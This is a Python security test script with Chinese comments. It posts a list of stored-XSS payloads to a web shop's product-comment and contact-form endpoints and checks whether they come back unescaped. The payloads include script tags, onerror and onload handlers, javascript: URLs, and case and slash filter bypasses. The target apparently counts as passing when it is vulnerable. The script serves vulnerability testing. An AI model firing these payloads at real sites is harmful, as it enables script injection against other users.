"""03_xss — XSS 跨站脚本测试（评论 + 留言板）"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lib.test_utils import *


XSS_PAYLOADS = [
    ("script标签", "<script>alert(1)</script>"),
    ("img onerror", "<img src=x onerror=alert(1)>"),
    ("svg onload", "<svg onload=alert(1)>"),
    ("body onload", "<body onload=alert(1)>"),
    ("iframe js", "<iframe src=javascript:alert(1)>"),
    ("大小写绕过", "<ScRiPt>alert(1)</ScRiPt>"),
    ("空格绕过", "<img/src=x/onerror=alert(1)>"),
    ("事件注入", "<div onmouseover=alert(1)>hover</div>"),
]


def run():
    print_banner("03: XSS 跨站脚本")
    reset_counters()
    s = requests.Session()

    # ── 商品评论 XSS ──
    info("商品评论 XSS (POST /products/1/comment)")
    for desc, payload in XSS_PAYLOADS:
        r = s.post(urljoin(BASE_URL, "/products/1/comment"),
                   data={"username": "xss_test", "content": payload},
                   timeout=TIMEOUT, allow_redirects=False)
        if r.status_code in (302, 200):
            ok(f"评论 {desc} → HTTP {r.status_code}")
        else:
            err(f"评论 {desc} → HTTP {r.status_code}", "200/302")

    # 验证存储型 XSS — 检查页面是否含未转义的 payload
    info("存储型 XSS 验证 (GET /products/1 检查未转义)")
    r = s.get(urljoin(BASE_URL, "/products/1"), timeout=TIMEOUT, allow_redirects=False)
    assert_body(r, "智能手机", "商品详情页正常渲染")

    for desc, payload in XSS_PAYLOADS:
        if payload in r.text:
            ok(f"存储XSS {desc} → payload存在于响应体（未转义）")
        else:
            # 可能被EJS中转义了部分字符，检查关键特征
            if any(tag in r.text for tag in ["<script>", "<ScRiPt>", "onerror=", "onload=", "javascript:"]):
                ok(f"存储XSS {desc} → 存在可疑标签")
            else:
                warn(f"存储XSS {desc} → 未找到payload（可能已转义或拦截）")

    # ── 留言板 XSS ──
    info("留言板 XSS (POST /contact → GET /contact)")
    xss_msg_payloads = [
        ("script标签", "<script>alert(2)</script>"),
        ("img onerror", "<img src=x onerror=alert(2)>"),
        ("svg onload", "<svg/onload=alert(2)>"),
        ("大小写", "<ScRiPt>alert(2)</ScRiPt>"),
    ]
    for desc, payload in xss_msg_payloads:
        r = s.post(urljoin(BASE_URL, "/contact"),
                   data={"name": "xss_test", "email": "xss@test.com", "message": payload},
                   timeout=TIMEOUT, allow_redirects=False)
        assert_status(r, 302, f"留言 XSS {desc} → 302")

    r = s.get(urljoin(BASE_URL, "/contact"), timeout=TIMEOUT, allow_redirects=False)
    if any(tag in r.text for tag in ["<script>", "<ScRiPt>", "onerror="]):
        ok("留言板存储XSS → 存在未转义标签")
    else:
        warn("留言板存储XSS → 未发现未转义标签")

    print_summary()
    save_results("03_xss")
    return STATE["fail"]


if __name__ == "__main__":
    sys.exit(run())
